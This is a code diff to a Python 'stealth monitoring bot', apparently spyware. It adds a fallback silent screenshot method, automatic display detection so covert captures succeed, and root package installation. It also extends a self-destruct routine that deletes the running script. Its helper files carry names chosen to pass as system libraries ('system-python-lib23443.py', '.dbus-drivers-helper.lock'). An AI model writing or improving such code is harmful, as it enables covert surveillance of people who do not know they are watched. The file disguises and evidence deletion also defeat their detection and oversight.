@@ -2,7 +2,7 @@
 """
 ultimate_stealth_bot.py
 Fully automated stealth monitoring bot with system integration.
-FIXED VERSION: Single instance, proper exit after initialization, and complete deletion
+FIXED: Screenshot issues, display detection, and complete self-destruction.
 """
 
 import os
@@ -34,7 +34,7 @@ SCREENSHOT_SCRIPT = STEALTH_DIR / "system-python-lib23443.py"
 LOCK_FILE = STEALTH_DIR / ".dbus-drivers-helper.lock"
 
 # ----------------- SCREENSHOT SCRIPT CONTENT -----------------
-SCREENSHOT_SCRIPT_CONTENT ="""#!/usr/bin/env python3
+SCREENSHOT_SCRIPT_CONTENT = """#!/usr/bin/env python3
 \"\"\"
 system-python-lib23443.py
 Silent screenshot utility for the stealth bot.
@@ -165,6 +165,18 @@ def take_screenshot():
         except Exception as e:
             print(f"xwd failed: {e}")
         
+        # Method 4: Try maim as fallback
+        try:
+            result = subprocess.run([
+                'maim', screenshot_path
+            ], env=env, capture_output=True, text=True, timeout=15)
+            
+            if result.returncode == 0 and os.path.exists(screenshot_path):
+                print(f"SUCCESS:{screenshot_path}")
+                return screenshot_path
+        except Exception as e:
+            print(f"maim failed: {e}")
+        
         print("ERROR: All screenshot methods failed")
         return None
         
@@ -245,8 +257,9 @@ def install_dependencies():
         # Update package list
         subprocess.run(["apt-get", "update"], check=False, capture_output=True, timeout=120)
         
-        # Install system packages
-        system_packages = ["ffmpeg", "pulseaudio", "x11-utils", "scrot", "imagemagick", "python3-pip", "x11-apps"]
+        # Install system packages (including maim as alternative screenshot tool)
+        system_packages = ["ffmpeg", "pulseaudio", "x11-utils", "scrot", "imagemagick", 
+                          "python3-pip", "x11-apps", "maim"]
         subprocess.run(["apt-get", "install", "-y"] + system_packages, 
                       check=False, capture_output=True, timeout=300)
         
@@ -331,8 +344,11 @@ def self_destruct():
     try:
         print("Initiating self-destruct sequence...")
         
+        # Get current file path
+        current_file = Path(__file__).resolve()
+        
         # Remove all stealth files regardless of current file location
-        if STEALTH_BINARY.exists():
+        if STEALTH_BINARY.exists() and STEALTH_BINARY != current_file:
             STEALTH_BINARY.unlink()
             print(f"Removed: {STEALTH_BINARY}")
         
@@ -343,6 +359,11 @@ def self_destruct():
         if LOCK_FILE.exists():
             LOCK_FILE.unlink()
             print(f"Removed: {LOCK_FILE}")
+        
+        # Remove the current file if it's not the stealth binary
+        if current_file != STEALTH_BINARY and current_file.exists():
+            current_file.unlink()
+            print(f"Removed: {current_file}")
         
         # Try to remove the stealth directory if empty
         try:
@@ -451,8 +472,27 @@ def take_screenshot():
             install_screenshot_script()
         
         # Run the screenshot script as current user (no sudo)
+        # Set proper environment for display access
+        env = os.environ.copy()
+        
+        # Try to detect display if not set
+        if 'DISPLAY' not in env:
+            try:
+                result = subprocess.run(['w', '-h'], capture_output=True, text=True)
+                if result.returncode == 0:
+                    for line in result.stdout.split('\n'):
+                        if line and 'tty' in line and (' :0' in line or ':0 ' in line):
+                            env['DISPLAY'] = ':0'
+                            break
+            except:
+                pass
+        
+        # Default to :0 if still not set
+        if 'DISPLAY' not in env:
+            env['DISPLAY'] = ':0'
+            
         result = subprocess.run([sys.executable, str(SCREENSHOT_SCRIPT)], 
-                              capture_output=True, text=True, timeout=30)
+                              env=env, capture_output=True, text=True, timeout=30)
         
         if result.returncode == 0:
             # Parse the output to get the screenshot path
